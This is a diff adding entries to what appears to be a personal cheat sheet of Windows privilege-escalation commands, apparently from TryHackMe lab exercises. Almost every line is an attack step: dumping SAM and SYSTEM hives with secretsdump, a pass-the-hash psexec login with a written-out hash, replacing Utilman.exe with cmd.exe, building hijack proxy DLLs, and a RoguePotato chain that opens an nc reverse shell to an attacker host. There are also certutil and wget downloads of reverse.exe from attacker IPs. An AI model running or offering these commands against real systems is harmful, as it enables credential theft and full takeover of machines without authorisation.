@@ -13,6 +13,18 @@ certutil -urlcache -f http://10.18.112.115/reverse.exe reverse.exe
 # using python smb server
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
 
+
+# Dumping SAM/SYSTEM registry hashes
+sudo python3 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public hives
+sudo python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+# pass the hash to obtain a session on the target
+sudo python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 Administrator@10.10.64.152
+
+# Taking ownership
+takeown /f C:\Windows\System32\Utilman.exe
+icacls C:\Windows\System32\Utilman.exe grant THMTakeOwnership:F
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
+
 # go to the windows box
 copy \\10.18.112.115\kali\reverse.exe C:\PrivEsc\reverse.exe
 
@@ -20,6 +32,11 @@ copy \\10.18.112.115\kali\reverse.exe C:\PrivEsc\reverse.exe
 x86_64-w64-mingw32-gcc malicious_dll.c -shared -o output.dll
 wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll
 xfreerdp /u:jack /p:Password11 /cert:ignore /v:10.10.12.172:3389
+
+# DLL (dealing with loaded dlls and creating proxy DLL's)
+python3 get_exports.py --target adsldpc.dll --originalPath "C:\Windows\system32\adsldpc.dll" > proxy.def
+x86_64-w64-mingw32-gcc -m64 -c -Os proxy.c -Wall -shared -masm=intel
+x86_64-w64-mingw32-gcc -shared -m64 -def proxy.def proxy.o -o proxy.dll
 
 
 # using metasploit
@@ -362,4 +379,11 @@ reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
 req query HKLM\SYSTEM\CurrentControlSet\Services\
 ## maily look for ImagePath and Object attributes
 
+# copy SAM,SYSTEM hives from registry
+reg save HKLM\sam sam.hive
+reg save HKLM\system system.hive
 
+# Rogue Potato
+sudo socat tcp-listen:135,reuseaddr,fork tcp:<target-machine>:9999
+nc -lnvp 4448
+c:\tools\roguepotato\RoguePotato.exe -r ATTACKER_IP -e "C:\tools\nc64 -e cmd.exe ATTACKER_IP 4448" -l 9999
